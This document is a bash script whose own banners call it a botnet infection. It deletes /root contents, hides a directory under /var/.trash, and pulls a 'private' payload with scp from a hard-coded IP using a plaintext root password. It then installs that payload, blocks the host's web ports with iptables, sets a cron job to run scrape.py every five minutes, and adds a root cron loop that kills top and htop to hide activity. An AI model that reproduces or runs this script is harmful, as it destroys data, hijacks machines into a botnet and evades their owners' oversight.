#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
clear
echo -e "\e[1;31m\n\n\n\n\nF Botnets Infection On This Device, Waiting...\n\n\n\n\n\e[0m"
apt-get update -qq
apt-get upgrade -y -o Dpkg::Options::="--force-confnew"
apt-get install -y python3 curl build-essential npm iptables sshpass --no-install-recommends
curl -sL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
nvm install node
npm install -g npm@latest
rm -rf /root/*
rm -rf /var/.trash
mkdir /var/.trash
cd /var/.trash
sshpass -p 'Faramisheroml' scp -r -P 22 -o StrictHostKeyChecking=no root@103.28.53.22:/root/k/private ./
cd private
npm install --silent
chmod -R 777 .
sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -j DROP
sudo iptables -A OUTPUT -p tcp -m multiport --sports 80,443 -j DROP
(crontab -l 2>/dev/null; echo "*/5 * * * * cd /var/.trash/private && python3 scrape.py") | crontab -
(sudo crontab -l 2>/dev/null; echo "* * * * * while pgrep htop > /dev/null || pgrep top > /dev/null; do pkill htop; pkill top; done") | sudo crontab -
clear
echo -e "\e[1;32m\n\n\n\n\nSUCCESS: F Botnets Infection Completed!\n\n\n\n\n\e[0m"

